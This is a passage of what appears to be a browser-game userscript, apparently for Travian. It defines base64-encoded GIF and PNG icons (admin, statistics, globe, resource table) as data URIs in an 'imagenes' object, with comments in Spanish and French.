MFNQSxxyKoBwthdKAJBYjA9nDRvR7g4Q8hQMQ11uGOUqxDHOuIAjYS8IM0eCpZ9ioEEoARM4MYwy3+4McSYNOPNlHjG45Qx0DsAQMXCOARcmlCAmAgie3pgxD+oXiCGswRgV18oQynUMI1qEGNR2ADAAGwmuPScIVY3IMd9BMI8cRCjQOwyh/f2IY5AsAAU/0jG8IogiACQC4KbCAAEBiIpf6hCCE8oQal2AUYEkGKGnzhHegDwy4CUIvGSeEcckiEPPBBCarUjy9oc85UMqWERmhAGP/gRhD2oJhokIMbEQhCFggyR4G8ow4NYAM1MEiNXbAhEecTxy6wUQg+xCIWp5BHWUhoELcIB0pAKYcp3MgNgSwiB5qAXiazkYyClFIgxTACNYzghnWsIwQt2MUEKciIHdRCFXeBJP9akY5LAUcsd+LQNz4DgU2QYxMRmEMQNtAFZRrkmQP+2UcpwOCGRLzjn+sApDjcAQdrlCUyvqFEcQbyIRDhqU1BesUmNhENXEWMAyIgwCwQgk+CJGIdKLCmNTEoDnOoDW2l6Qc+WvEvVIGoO23SSTbsIRBydIABAZDDD0bJUYXwI6QiXQc//qG2Nt0JRP1AhSMFgqrukAYo5SQINyRwgA2QSyEdNYg+MOgOhhbphA4VCy+1CICymvWsaE2rWtfK1ra2dTUhi4xe1Ka2imR1IcAgRZCMIdeyGOMXA+ErlEzTprrGYCJ3JUgHzPgPY+gAFUZqC2oeSk4tRgah/nCT2gxBC2UgISKJhWYIUBACXjS2FVY5of2IA1eigic4hoH+qDFS0dljBIMPDwntPzSAgt6i4ARUQG2moBKqfiyjtekwjFObkjk50OIYtrWtLSoBCYaEdgu+PUELODACSlihGCc8KmSkgdzvONRNnEhFMI5Bi0zYArrBsEUmnJaQjv7AC4P4h29bcAIU1IAFlFgGCjoQMHz8xn5jFYhTV+uPbWTiuco4RoQnrIz4pgIKPSUIM8jABi88YQL+7W0NUJAHYwgYBRpgQVQME7mBSLY/hmkCLdY74egGQxkRji8tdsAMZxbEC2TAAyGErIYK+DYEy2DHCHyrgBAYuDQsNadDUQOFK6x3vZlQL3S3POMKF2AAPZYjQRThBDWw4cxs4DD+GUZL2hCkoLca+IInlvBShRKkoQ6VSiXakArbnoMWqchxhZ97jB304I6iEPNAOKyGRuOBDY8mA4c1wGbSViASHmBFCJqSDrYQBBwOnUdwxGIEPEjhvdHdcjCu/AEeCEEITehh6gTSAjIQQgyEIIQaCIHmNJOBDv3trRucgABWeCIE6DBGK6BFkLYs2DccYFofHhzhLUtYAa/mQQ9sIAQFzrELZDAzpNmgBjyYm8hmxsMFQqAAT0zCE7cgBiLm0eJPh8gfXziDEFrnBy744QzOzYSEK7wDO/Lgez1wAidmnYUgD3nXum60uMmtAU8swA2eyLgRItEILEa12S/1BwT+psAEjzHND2LYAaELYYMeCEHbNxBCD3wx6390Apvm5vCQHy1kPKjhC8QwwgVQYAQUeMETevALswsCarRMAR+8CMENuED1dpWBCzfI8iR6wIMnbJsH2k70M3WhaRToGs0RL/ItEOAJK9xCAU44uh7qXZBvkIYdQrhxE1wxAA34od9ceMIR/pEDTPTA5S/neg/EPpBX6MIZkWgAAVqga1s/mg2IiATbvUCMEMSdFYiwCkJ6wpdjNCETmRBDKCoAxQ/g4BsDoYAraMB1bWvbBqZ9Jiuc4YYGICAAAHDCmXetAGKwguwhcIbnncCKRrT2IB/qhxRqUAVTwMEVFfgFLg7+oTZcKMIHMwjFDG5waLALwQY0fyYxiBF5BBjhFp6IRAUIcQJPEMMZ6y82CuKO9I8fRFr9UAX3cA/lUA1ZcAlZMAhq8waM4AM1EAq11wM3cHuFoAylpAme4AyIoAIK4AVucAsngAXYtHuecATfoAKesH9OoAtgsHQJgQ+ygAa6JBa94AjaAAdgIAlosAfQIAKzN4Gu1nJP8GAAMA6QkANOYASegAjNgAK+kAB7wAzbkIFLOApiYQIpSGJoAAqJthDboBcdIAv4kAufcApZAA3bUA0SEAo2IIRt+AAvYABpAAAH4IFf4AGEcAHNoAnbgAacIA3p4AnTAHpK0g9BwAr+XfANlCANVqAD0SJOMBAETwAHOSABRfAN0rANPmgD2jYBL3AcqLAMeqMCN+cFbBACFWAHmdIL2yANWBAJ0yBvOMAO+AACrAAIqJUDOlBmebAQSYJOdlAEmiAAorAI+PAMDSYCdDADFeAA3oUK4EAFiyAPAAANAkEKJvAPFyCFhXUIeSCInjBsF+APJqALd0AJWzABZEABoPAGDCFYwcEMi2ACivCF/aBLbZAJypAG4GAF4HAIsxBVc/QM0jAFrbgNQGEMyTAK4LB7rOAG7MAC/XABujAF0kBz7vgQvyhO49ALZSEPQTBjlbAFJoCQdLUNAHCSCBlTfJEM5QAK9hf+CYIgD1vgD71wCEsVZhoZKpDUGXqRDstQVPGSkiZJLNF3j1ixfp4gCMe4DHnwfBPxiyrFF5fVk2eRWZkDJDHlJkilUuPQD4AQf0fQD9BACVBJEW0yLXdiGspzlVLBH1FBGsXlFqOSByWEEUSSJKEGIpDhHbDlD9wRcoYhTmXBDqh1lxpBJM4WlwcWl6jRG8olmP8hFK0wJR6Rl/4Aao3ZH6IWGfyxXPc2D4bZSCKxPBziUuYFYwAwmAfWmKKJCmZpmSPhD8agVEeymd2BF/7hHeywDJRglv5XEqbZITyxmfiwmiCCJBzym23iEvPgJrWJCrZpDNLAJkpFCaiQE8Em+RI9wQ5GwiEk1CFLdRPkWZ7meZ7omZ7quZ7s2Z7u+Z7wGZ8HERAAOw==';
	//image admin
	imagenes["admin"] = 'data:image/gif;base64,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';
	// Imagen de una grafica para las estadisticas
	imagenes["stat"] = 'data:image/gif;base64,R0lGODlhDAAKAIABAAAAAP///yH5BAEAAAEALAAAAAAMAAoAAAIVjA1wi82eFJP0RIhD1Xn77mhKIhoFADs=';
	// globe planetaire
	imagenes["globe"]= 'data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAwAAAAMCAYAAABWdVznAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAI2SURBVHjaHI5fSBNxAMe/99vl2p9bW62YseVWKSyJaGoaLk0jfCihHnrQiKjeCxLqJQgEseghCHzpYdFTLxlSQgUra0XLwNDRWFvq5G5bTed2t7vdbbety/V5+D59vvCh8pKC+Mo65LqILm8rvs0vDSyups7Xqgpx7XW+6us99jbyI4Y6ZcLp7gOgGofl5AbqOnng85f4bF/PEWObywlCNES5NN4Ew5WT3e2jSs3wYrDLA0LTOjCmpsE7Uwvv233dRhh3YaVYRILfhNViwpmhIf29QGSaMW67RNMElKZp8I9MaN6OIex3arB7HHC02UAoHYpZGdwii2iyirmvYbAzNyg6NJ/wp2Q9qBQLkbLC3+lGYbsOunoT1vgComkZ8V8cOJZGaDF1m8RWk6f0Zgp2pxm2PVbAooeq14NXVXDZLFbTAuRyHSc6bZgNJzrIek6kdVtZRiNgbrYg8imJSDAOk4Xg0NEWKHkZTjuDMhFQ41ma+Du9waJQgVCqQFHyyCyl8XrqO6YfhSEVqlCVEpgdBuS43zh+2JMkbT7vR0aTILIqNjM5NLsdkItlVPga1tfS6OhpgagK0CQBF872T5KSXEHg7uhIbGkB3FoWYl7EPjcDV4sB7HIOmewfhObeYfz68FNRKeeo6IaEVOQnSqR25dbETACMDTt3O6BqArKcAKJs4v7YucDF4f5r2II0plb/C14qP3n5eIwav+y7edCQf9ZKKc8nr/Y+SH14aM/x0n+5wT8BBgAq+wP5CWdgHAAAAABJRU5ErkJggg==';
	// Image ressource pour tableau info ressource dorf1
	imagenes["r0"] = 'data:image/gif;base64,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